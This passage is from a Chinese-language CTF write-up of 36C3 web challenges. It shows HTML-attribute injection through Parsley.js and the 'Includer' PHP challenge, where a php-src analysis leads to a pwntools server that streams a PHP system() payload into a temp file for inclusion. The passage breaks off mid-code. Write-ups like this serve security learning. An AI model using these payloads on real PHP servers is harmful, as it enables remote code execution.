class="hljs-string">"Liked by&lt;/h3&gt;admin"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> txt:</span><br><span class="line">            flag += j</span><br><span class="line">            print(i,flag)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>拿到 writeup id 之后直接访问即可：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108021442.png" alt=""></p><h3 id="Other-Selector"><a href="#Other-Selector" class="headerlink" title="Other Selector"></a>Other Selector</h3><p>当然该页面不仅可以使用 a 标签的 href 属性进行获取 writeup id，也可以获取它 value 值，例如：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">id</span>=<span class="hljs-string">"like"</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">data-parsley-trigger</span>=<span class="hljs-string">"blur"</span> <span class="hljs-attr">autofocus</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">name</span>=<span class="hljs-string">"some-field"</span> </span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">data-parsley-error-message</span>=<span class="hljs-string">"&lt;input id=like type=button&gt;"</span> <span class="hljs-attr">data-parsley-required</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">data-parsley-errors-container</span>=<span class="hljs-string">"a:contains('Writeup - 5'):eq(0)"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>或者使用<code>data-parsley-equalto</code> API 进行判断属性值：</p><blockquote><p><strong>data-parsley-equalto=”#anotherfield”</strong></p><p>Validates that the value is identical to another field’s value (useful for password confirmation check).</p></blockquote><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> </span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-trigger</span>=<span class="hljs-string">"focusout"</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-equalto</span>=<span class="hljs-string">'a[href^="/show.php?id=GUESS"]'</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-errors-container</span>=<span class="hljs-string">"form[action='/like.php']"</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-error-message</span>=<span class="hljs-string">'&lt;input type="input" name="id" value="0000000000000000"&gt;'</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">value</span>=<span class="hljs-string">'a[href^="/show.php?id=GUESS"]'</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">autofocus</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Includer"><a href="#Includer" class="headerlink" title="Includer"></a>Includer</h2><blockquote><p><strong>Difficulty estimate</strong>: medium</p><p><strong>Solved</strong>:9/321</p><p><strong>Points</strong>: round(1000 · min(1, 10 / (9 + [9 solves]))) = <strong>556</strong> points</p><p><strong>Description:</strong></p><p>Just sitting here and waiting for PHP 8.0 (lolphp).</p><p><strong>Download:</strong></p><p><a href="https://github.com/ZeddYu/36c3-CTF-Web/blob/master/includer/includer-df39401c4c1c28ab.tar.xz" target="_blank" rel="noopener">includer-df39401c4c1c28ab.tar.xz (3.5 KiB)</a></p></blockquote><p>题目给出源代码以及部署文件，源代码如下：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);</span><br><span class="line"></span><br><span class="line">$rand_dir = <span class="hljs-string">'files/'</span>.bin2hex(random_bytes(<span class="hljs-number">32</span>));</span><br><span class="line">mkdir($rand_dir) || <span class="hljs-keyword">die</span>(<span class="hljs-string">'mkdir'</span>);</span><br><span class="line">putenv(<span class="hljs-string">'TMPDIR='</span>.<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">'/'</span>.$rand_dir) || <span class="hljs-keyword">die</span>(<span class="hljs-string">'putenv'</span>);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'Hello '</span>.$_POST[<span class="hljs-string">'name'</span>].<span class="hljs-string">' your sandbox: '</span>.$rand_dir.<span class="hljs-string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">try</span> {</span><br><span class="line">    <span class="hljs-keyword">if</span> (stripos(file_get_contents($_POST[<span class="hljs-string">'file'</span>]), <span class="hljs-string">'&lt;?'</span>) === <span class="hljs-keyword">false</span>) {</span><br><span class="line">        <span class="hljs-keyword">include_once</span>($_POST[<span class="hljs-string">'file'</span>]);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">finally</span> {</span><br><span class="line">    system(<span class="hljs-string">'rm -rf '</span>.escapeshellarg($rand_dir));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Configuration-Error"><a href="#Configuration-Error" class="headerlink" title="Configuration Error"></a>Configuration Error</h3><p>其中配置文件有一个比较明显的配置错误：</p><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location /.well-known {</span><br><span class="line">  autoindex on;</span><br><span class="line">  alias /var/www/html/well-known/;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>开启了列目录并且我们可以遍历到上层文件夹。</p><h3 id="Upload-Arbitrary-Data"><a href="#Upload-Arbitrary-Data" class="headerlink" title="Upload Arbitrary Data"></a>Upload Arbitrary Data</h3><p>一开始我看到这个没有<code>&lt;?</code>的形式，我想到的是p牛博客里面有关死亡 exit 的内容，<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a>，奈何原文用的是<code>file_put_content</code>，我们这里用的是<code>file_get_contents</code>，并且这里的判断也在使用了<code>file_get_contents</code>函数之后进行判断是否有<code>&lt;?</code>，所以这里的编码绕过就不太可能了。</p><p>而且这里最奇怪的就是之前用了一些看似无关紧要的代码，比如使用了<code>putenv()</code>函数等，给了我们一个 sandbox ，然而我们似乎无法利用表面的代码进行文件上传啥的操作。</p><p>balsn 队伍在公开的 wp 中写了比较详细的源码分析，这里我就配合其中的 wp 进行一下简单的分析。</p><p>首先直接给出结论，我们可以使用<code>compress.zip://</code>流进行上传任意文件，接着我们来看看相关原理。</p><p>在 <a href="https://github.com/php/php-src" target="_blank" rel="noopener">php-src</a> 源代码中，我们可以找到该流的相关触发解析函数<code>php_stream_gzopen</code></p><p>ext/zlib/zlib_fopen_wrapper.c</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">php_stream *<span class="hljs-title">php_stream_gzopen</span><span class="hljs-params">(php_stream_wrapper *wrapper, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode, <span class="hljs-keyword">int</span> options,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">  zend_string **opened_path, php_stream_context *context STREAMS_DC)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">true...</span><br><span class="line">true<span class="hljs-keyword">if</span> (strncasecmp(<span class="hljs-string">"compress.zlib://"</span>, path, <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>) {</span><br><span class="line">truetruepath += <span class="hljs-number">16</span>;</span><br><span class="line">true} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strncasecmp(<span class="hljs-string">"zlib:"</span>, path, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) {</span><br><span class="line">truetruepath += <span class="hljs-number">5</span>;</span><br><span class="line">true}</span><br><span class="line"></span><br><span class="line">trueinnerstream = php_stream_open_wrapper_ex(path, mode, STREAM_MUST_SEEK | options | STREAM_WILL_CAST, opened_path, context);</span><br><span class="line">true...</span><br><span class="line">true<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以看到有个标志位<code>STREAM_WILL_CAST</code>，我们可以先看看这个标志位用来干嘛，在<code>main/php_streams.h</code>定义了该标志位:</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* If you are going to end up casting the stream into a FILE* or</span></span><br><span class="line"><span class="hljs-comment"> * a socket, pass this flag and the streams/wrappers will not use</span></span><br><span class="line"><span class="hljs-comment"> * buffering mechanisms while reading the headers, so that HTTP</span></span><br><span class="line"><span class="hljs-comment"> * wrapped streams will work consistently.</span></span><br><span class="line"><span class="hljs-comment"> * If you omit this flag, streams will use buffering and should end</span></span><br><span class="line"><span class="hljs-comment"> * up working more optimally.</span></span><br><span class="line"><span class="hljs-comment"> * */</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STREAM_WILL_CAST                0x00000020</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>很明显，这是一个用来将 stream 转换成 FILE* 的标志位，在这里就与我们创建临时文件有关了。</p><p>接着我们跟进<code>php_stream_open_wrapper_ex</code>函数，该函数在<code>main/php_streams.h</code>中被 define 为<code>_php_stream_open_wrapper_ex</code>。</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI php_stream *_php_stream_open_wrapper_ex(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode, <span class="hljs-keyword">int</span> options,</span><br><span class="line">truetruezend_string **opened_path, php_stream_context *context STREAMS_DC)</span><br><span class="line">{</span><br><span class="line">true<span class="hljs-comment">//...</span></span><br><span class="line">true<span class="hljs-keyword">if</span> (stream != <span class="hljs-literal">NULL</span> &amp;&amp; (options &amp; STREAM_MUST_SEEK)) {</span><br><span class="line">truetruephp_stream *newstream;</span><br><span class="line"></span><br><span class="line">truetrue<span class="hljs-keyword">switch</span>(php_stream_make_seekable_rel(stream, &amp;newstream,</span><br><span class="line">truetruetruetruetrue(options &amp; STREAM_WILL_CAST)</span><br><span class="line">truetruetruetruetruetrue? PHP_STREAM_PREFER_STDIO : PHP_STREAM_NO_PREFERENCE))</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">true<span class="hljs-keyword">return</span> stream;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">/* }}} */</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>该函数调用了<code>php_stream_make_seekable_rel</code>，并向其中传入了<code>STREAM_WILL_CAST</code>参数，我们跟进<code>php_stream_make_seekable_rel</code>函数，它在<code>main/php_streams.h</code>中被 define 为<code>_php_stream_make_seekable</code>，继续跟进</p><p>main/streams/cast.c</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* {{{ php_stream_make_seekable */</span></span><br><span class="line">PHPAPI <span class="hljs-keyword">int</span> _php_stream_make_seekable(php_stream *origstream, php_stream **newstream, <span class="hljs-keyword">int</span> flags STREAMS_DC)</span><br><span class="line">{</span><br><span class="line">true<span class="hljs-keyword">if</span> (newstream == <span class="hljs-literal">NULL</span>) {</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> PHP_STREAM_FAILED;</span><br><span class="line">true}</span><br><span class="line">true*newstream = <span class="hljs-literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">true<span class="hljs-keyword">if</span> (((flags &amp; PHP_STREAM_FORCE_CONVERSION) == <span class="hljs-number">0</span>) &amp;&amp; origstream-&gt;ops-&gt;<span class="hljs-built_in">seek</span> != <span class="hljs-literal">NULL</span>) {</span><br><span class="line">truetrue*newstream = origstream;</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> PHP_STREAM_UNCHANGED;</span><br><span class="line">true}</span><br><span class="line"></span><br><span class="line">true<span class="hljs-comment">/* Use a tmpfile and copy the old streams contents into it */</span></span><br><span class="line"></span><br><span class="line">true<span class="hljs-keyword">if</span> (flags &amp; PHP_STREAM_PREFER_STDIO) {</span><br><span class="line">truetrue*newstream = php_stream_fopen_tmpfile();</span><br><span class="line">true} <span class="hljs-keyword">else</span> {</span><br><span class="line">truetrue*newstream = php_stream_temp_new();</span><br><span class="line">true}</span><br><span class="line">true<span class="hljs-comment">//...</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">/* }}} */</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以看到如果<code>flags</code>与<code>PHP_STREAM_PREFER_STDIO</code>都被设置的话，而<code>PHP_STREAM_PREFER_STDIO</code>在 main/php_streams.h 中已经被 define</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PHP_STREAM_PREFER_STDIO1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们只需要关心 flags 的值就好了，我们只需要确定 flags 的值非零即可，根据前面的跟进我们易知 flags 的在这里非零，所以这里就调用了<code>php_stream_fopen_tmpfile</code>函数创建了临时文件。</p><p>于是我们可以做一个简单的验证，在本机上跑源代码，并用 pwntools 起一个服务用来发送一个大文件</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> threading</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_chunk</span><span class="hljs-params">(l, data)</span>:</span></span><br><span class="line">    l.send(<span class="hljs-string">'''{}\r</span></span><br><span class="line"><span class="hljs-string">{}\r</span></span><br><span class="line"><span class="hljs-string">'''</span>.format(hex(len(data))[<span class="hljs-number">2</span>:], data))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):</span><br><span class="line">    l = listen(<span class="hljs-number">9999</span>)</span><br><span class="line">    l.wait_for_connection()</span><br><span class="line"></span><br><span class="line">    data1 = <span class="hljs-string">''</span>.ljust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">'X'</span>)</span><br><span class="line">    data2 = <span class="hljs-string">'&lt;?php system("/readflag"); exit(); /*'</span>.ljust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">'b'</span>)</span><br><span class="line">    data3 = <span class="hljs-string">'c*/'</span>.rjust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">'c'</span>)</span><br><span class="line"></span><br><span class="line">    l.recvuntil(<span class="hljs-string">'\r\n\r\n'</span>)</span><br><span class="line">    l.send(<span class="hljs-string">'''HTTP/1.1 200 OK\r</span></span><br><span class="line"><span class="hljs-string">Content-Type: exploit/revxakep\r</span></span><br><span class="line"><span class="hljs-string">Connection: close\r</span></span><br><span class="line"><span class="hljs-string">Transfer-Encoding: chunked\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">'''</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data1)</span><br><span class="line"></span><br><span class="line">    print(<span class="hljs-string">'waiting...'</span>)</span><br><span class="line">    print(<span class="hljs-string">'sending php code...'</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data2)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="hljs-number">3</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data3)</span><br><span class="line"></span><br><span class="line">    l.send(<span class="hljs-string">'''0\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">'''</span>)</span><br><span class="line">    l.close()</span><br></pre></td></tr></tbody></table></figure><p></p><p>这样我在本机上用 fswatch 很明显可以看到临时文件已经生成，并且文件内容就是我们发送的内容。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107053126.png" alt=""></p><h3 id="Keep-Temp-File"><a href="#Keep-Temp-File" class="headerlink" title="Keep Temp File"></a>Keep Temp File</h3><p>临时文件终究还是会被 php 删除掉的，如果我们要进行包含的话，就需要利用一些方法让临时文件尽可能久的留存在服务器上，这样我们才有机会去包含它。</p><p>所以这里是我们需要竞争的第一个点，基本上我们有两种方法让它停留比较久的时间：</p><ul><li>使用大文件传输，这样在传输的时候就会有一定的时间让我们包含到文件了。</li><li>使用 FTP 速度控制，大文件传输根本上还是传输速度的问题，我们可以通过一些方式限制传输速率，比较简单的也可以利用<code>compress.zlib://ftp://</code>形式，控制 FTP 速度即可</li></ul><h3 id="Bypass-Waf"><a href="#Bypass-Waf" class="headerlink" title="Bypass Waf"></a>Bypass Waf</h3><p>接下来我们就要看如何来对关键地方进行绕过了。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (stripos(file_get_contents($_POST[<span class="hljs-string">'file'</span>]), 